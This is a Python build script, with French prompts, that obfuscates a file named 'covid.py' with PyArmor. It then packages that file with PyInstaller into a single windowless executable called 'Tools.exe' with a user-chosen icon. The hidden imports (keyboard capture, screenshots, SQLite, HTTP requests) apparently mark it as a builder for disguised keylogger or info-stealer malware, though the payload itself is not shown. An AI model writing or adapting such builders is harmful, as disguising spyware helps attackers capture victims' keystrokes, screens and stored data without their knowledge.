import os
import subprocess
import shutil
from tkinter import Tk, filedialog


def run(cmd):
    result = subprocess.run(cmd)
    if result.returncode != 0:
        exit(1)


def builder():
    root = Tk()
    root.withdraw()

    icon_path = filedialog.askopenfilename(
        title="Choisir une icône",
        filetypes=[("ICO files", "*.ico")]
    )

    if not icon_path:
        print("Aucune icône choisie")
        return

    output_dir = "covid-exe"
    build_dir = "build"
    dist_dir = "dist"
    obf_dir = "obf"

    os.makedirs(output_dir, exist_ok=True)

    for d in [build_dir, dist_dir, obf_dir]:
        if os.path.exists(d):
            shutil.rmtree(d)

    run([
        "pyarmor",
        "gen",
        "-O", obf_dir,
        "covid.py"
    ])

    target_file = os.path.join(obf_dir, "covid.py")
    scanner_path = os.path.abspath("scanner.py")

    run([
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--name", "Tools",
        "--distpath", output_dir,
        "--workpath", build_dir,
        "--specpath", build_dir,
        "--icon", icon_path,

        "--paths=.",

        "--hidden-import=requests",
        "--hidden-import=pynput.keyboard",
        "--hidden-import=mss",
        "--hidden-import=sqlite3",
        "--hidden-import=webbrowser",

        "--collect-binaries", "sqlite3",

        "--add-data", f"{scanner_path};.",

        target_file
    ])
    print(f"\n[✓] Terminé -> {output_dir}/Tools.exe")


if __name__ == "__main__":
    builder()